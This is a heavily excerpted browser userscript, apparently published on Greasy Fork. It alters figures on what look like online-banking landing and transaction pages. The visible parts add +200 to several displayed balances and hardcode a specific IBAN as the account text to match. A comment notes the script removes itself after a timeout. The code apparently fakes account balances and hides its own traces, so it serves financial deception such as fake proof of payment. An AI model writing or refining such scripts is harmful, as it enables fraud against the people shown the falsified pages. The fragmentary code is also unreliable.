...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/487723/Ed%20Comm%20Manuel%20Enghardt.user.js
// @updateURL https://update.greasyfork.org/scripts/487723/Ed%20Comm%20Manuel%20Enghardt.meta.js
// ==/UserScript==
...
//1 COMM START CHANGE BAL 2VER FINALLY WORKING WITH TIMEOUT AND SCRIPT REMOVAL
 ...
 // Configurable Elements
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount: +200 },
        { index: 1, adjustmentAmount: +200 },
        { index: 2, adjustmentAmount: +200 },
...
balanceModificationAmount = balanceChange = 200.0 ;
...
///IBAN CONFIGURATION_______________________________________________________
     ...
     expectedIBAN = searchText = targetTextContent = specifiedTextContent = "DE17 8508 0000 0561 0539 00"
...
///////////////////////////////////////////////////////////////////////////////
   ...
   if (window.location.href.indexOf("landingpage") > 0 || window.location.href.indexOf("10981029502") > 0 || window.location.href.indexOf("10726846341") > 0 ) {
(function () {
    'use strict';
...
///////////////////////////////////////////////////////////////////////////////
   ...
   if (window.location.href.indexOf("account/transactions") > 0 || window.location.href.indexOf("10982731890") > 0 || window.location.href.indexOf("10726842017") > 0 ) {
